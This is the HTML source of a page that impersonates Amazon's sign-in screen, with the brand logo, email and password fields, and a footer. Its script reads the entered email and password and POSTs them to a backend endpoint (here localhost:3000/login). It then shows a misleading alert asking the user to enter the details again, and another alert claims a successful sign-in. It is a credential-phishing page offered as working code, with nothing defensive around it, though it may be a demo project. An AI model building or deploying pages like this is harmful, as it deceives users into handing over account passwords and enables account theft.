<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8" />
    <title>Amazon</title>
    <link
      rel="stylesheet"
      href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
      integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO"
      crossorigin="anonymous"
    />
  </head>

  <body>
    <script>
      function handleSubmit() {
        // Get form data
        var email = document.getElementById("exampleInputEmail1").value;
        var password = document.getElementById("exampleInputPassword1").value;

        // Create a JavaScript object with the form data
        var formData = {
          email: email,
          password: password,
        };

        // Perform a POST request to the backend endpoint
        fetch("http://localhost:3000/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(formData),
        })
          .then((response) => response.json())
          .then((data) => {
            // Handle the response from the server
            alert("please enter the deatails again")
            console.log(data);
            // You can add further actions based on the response
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }
    </script>

    <header>
      <!--Amazon Image Logo-->
      <div class="d-flex flex-row justify-content-center">
        <div class="row">
          <div class="col-md">
            <img
              class="img_1"
              src="https://cdn.iconscout.com/icon/free/png-256/free-amazon-1869030-1583154.png"
              alt="Amazon Logo"
            />
          </div>
          <!--Col 1 End-->
        </div>
        <!--Row 1 End-->
      </div>
      <!--Container End-->
      <!--Amazon Image Logo-->
    </header>
    <div class="d-flex flex-row justify-content-center">
      <div class="row">
        <div class="col-md">
          <form>
            <div class="sign-in">Sign In</div>
            <div class="form-group">
              <label id="words_1" for="exampleInputEmail1"
                >Email(phone for mobile accounts)</label
              >
              <input
                type="email"
                class="form-control"
                id="exampleInputEmail1"
                aria-describedby="emailHelp"
                placeholder="Enter email"
              />
              <small id="emailHelp" class="form-text text-muted"></small>
            </div>
            <div class="form-group">
              <label id="words_2" for="exampleInputPassword1"
                >Password &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp Forgot
                your password?
              </label>
              <input
                type="password"
                class="form-control"
                id="exampleInputPassword1"
                placeholder="Password"
              />
              <div class="form-group">
                <div onclick=handleSubmit()>
                   <input type="button" class="btn btn-warning" id="sign-in " value="Sign in" onclick="alert('Signed in successfully')"/>
                </div>

                <input
                  type="checkbox"
                  class="form-check-input checkbox"
                  id="exampleCheck1"
                />
                <p class="keep-sign-in">
                  Keep me signed in.
                  <a href="https://stupidlink.com">Details</a>
                </p>
              </div>
            </div>
            <div class="form-check"></div>
            <button type="button" class="btn btn-warning" id="grey-button">
              Create your Amazon account
            </button>
          </form>
        </div>
        <!--Col 1 End-->
      </div>
      <!--Row 1 End-->
    </div>
    <!--Container End-->
    <!--Form-->

    <div class="d-flex flex-row justify-content-center footer_1">
      <div class="row">
        <div class="col">
          <p class="conditions">
            <a>Conditions of Use &nbsp &nbsp &nbsp </a>
            <a>Privacy Notice&nbsp &nbsp &nbsp </a>
            <a>Help&nbsp &nbsp &nbsp </a>
          </p>
        </div>
        <!--Footer Col 1 End-->
      </div>
      <!--Footer Row 1 End-->
    </div>
  </body>
</html>
